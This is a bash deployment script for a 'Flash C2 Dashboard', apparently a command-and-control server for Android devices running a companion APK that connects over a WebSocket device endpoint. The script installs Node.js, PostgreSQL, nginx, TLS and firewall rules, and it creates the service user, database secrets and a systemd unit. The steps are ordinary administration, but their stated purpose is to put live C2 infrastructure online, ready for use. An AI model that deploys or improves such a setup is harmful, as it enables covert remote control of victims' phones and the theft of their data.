#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
#  Flash C2 Dashboard — One-Click VPS Deploy
#  Tested on Ubuntu 22.04 / 24.04 (root or sudo user)
#  Usage:  sudo bash deploy.sh
# ─────────────────────────────────────────────────────────────
set -euo pipefail

DOMAIN=""          # optional — set to enable auto-TLS via certbot
APP_DIR="/opt/flash-dashboard"
SERVICE_USER="flash"
DB_NAME="flash"
DB_USER="flash"
DB_PASS="$(openssl rand -hex 20)"
PORT=3000

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
die()   { echo -e "${RED}[✗]${NC} $*"; exit 1; }

[[ $EUID -ne 0 ]] && die "Run as root:  sudo bash deploy.sh"

# ── 1. System packages ────────────────────────────────────────
info "Updating system packages…"
apt-get update -qq
apt-get install -y -qq curl gnupg2 ca-certificates lsb-release \
  postgresql postgresql-contrib nginx openssl ufw

# ── 2. Node.js 20 LTS ─────────────────────────────────────────
if ! command -v node &>/dev/null || [[ $(node -e "process.exit(+process.version.slice(1)<18)") ]]; then
  info "Installing Node.js 20 LTS…"
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null
  apt-get install -y -qq nodejs
fi
info "Node $(node -v) · npm $(npm -v)"

# ── 3. PostgreSQL database ────────────────────────────────────
info "Configuring PostgreSQL…"
systemctl enable --now postgresql >/dev/null
sudo -u postgres psql -c "CREATE USER $DB_USER WITH PASSWORD '$DB_PASS';" 2>/dev/null || \
  sudo -u postgres psql -c "ALTER USER $DB_USER WITH PASSWORD '$DB_PASS';"
sudo -u postgres createdb -O "$DB_USER" "$DB_NAME" 2>/dev/null || true

# ── 4. App user & directory ───────────────────────────────────
info "Creating service user '$SERVICE_USER'…"
id "$SERVICE_USER" &>/dev/null || useradd -r -s /bin/false -d "$APP_DIR" "$SERVICE_USER"
mkdir -p "$APP_DIR"
cp -r ./* "$APP_DIR/"
chown -R "$SERVICE_USER:$SERVICE_USER" "$APP_DIR"

# ── 5. npm install ────────────────────────────────────────────
info "Installing npm dependencies…"
cd "$APP_DIR"
sudo -u "$SERVICE_USER" npm install --omit=dev --silent

# ── 6. Apply DB schema ────────────────────────────────────────
info "Applying schema.sql…"
sudo -u postgres psql -d "$DB_NAME" -f schema.sql >/dev/null

# ── 7. Write .env ─────────────────────────────────────────────
info "Writing .env…"
cat > "$APP_DIR/.env" <<ENV
PORT=$PORT
DATABASE_URL=postgresql://${DB_USER}:${DB_PASS}@localhost:5432/${DB_NAME}
NODE_ENV=production
ADMIN_TOKEN=$(openssl rand -hex 32)
ENV
chown "$SERVICE_USER:$SERVICE_USER" "$APP_DIR/.env"
chmod 600 "$APP_DIR/.env"

# ── 8. systemd service ────────────────────────────────────────
info "Installing systemd service…"
cat > /etc/systemd/system/flash.service <<SVC
[Unit]
Description=Flash C2 Dashboard
After=network.target postgresql.service

[Service]
Type=simple
User=$SERVICE_USER
WorkingDirectory=$APP_DIR
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=5
EnvironmentFile=$APP_DIR/.env
NoNewPrivileges=yes
PrivateTmp=yes

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable --now flash
sleep 2
systemctl is-active --quiet flash && info "flash service is running" || die "flash service failed to start — check: journalctl -u flash -n 50"

# ── 9. nginx reverse proxy ────────────────────────────────────
info "Configuring nginx…"
SERVER_NAME="${DOMAIN:-_}"

cat > /etc/nginx/sites-available/flash <<NGINX
server {
    listen 80;
    server_name $SERVER_NAME;

    location / {
        proxy_pass         http://127.0.0.1:$PORT;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade    \$http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host       \$host;
        proxy_set_header   X-Real-IP  \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
}
NGINX

ln -sf /etc/nginx/sites-available/flash /etc/nginx/sites-enabled/flash
rm -f /etc/nginx/sites-enabled/default
nginx -t >/dev/null && systemctl enable --now nginx && systemctl reload nginx

# ── 10. TLS (optional — requires DOMAIN set above) ───────────
if [[ -n "$DOMAIN" ]]; then
  info "Installing certbot for $DOMAIN…"
  apt-get install -y -qq certbot python3-certbot-nginx
  certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos -m "admin@$DOMAIN" --redirect
  systemctl reload nginx
else
  warn "DOMAIN not set — skipping TLS. Set DOMAIN at top of script and re-run for auto HTTPS."
fi

# ── 11. Firewall ──────────────────────────────────────────────
info "Configuring ufw firewall…"
ufw --force enable >/dev/null
ufw allow ssh >/dev/null
ufw allow http >/dev/null
ufw allow https >/dev/null
# Internal port closed from outside — nginx proxies it
ufw deny "$PORT" >/dev/null || true

# ── Done ──────────────────────────────────────────────────────
PUBLIC_IP=$(curl -sf https://api.ipify.org || echo "<your-vps-ip>")
echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  Flash C2 deployed successfully!${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  Dashboard:   http://${DOMAIN:-$PUBLIC_IP}"
echo -e "  APK WS URL:  ws://${DOMAIN:-$PUBLIC_IP}/ws/device"
echo ""
echo -e "  DB name:     $DB_NAME"
echo -e "  DB user:     $DB_USER"
echo -e "  DB pass:     $DB_PASS"
echo ""
echo -e "  .env:        $APP_DIR/.env"
echo -e "  Logs:        journalctl -u flash -f"
echo ""
warn "Save the DB password above — it won't be shown again."
echo ""
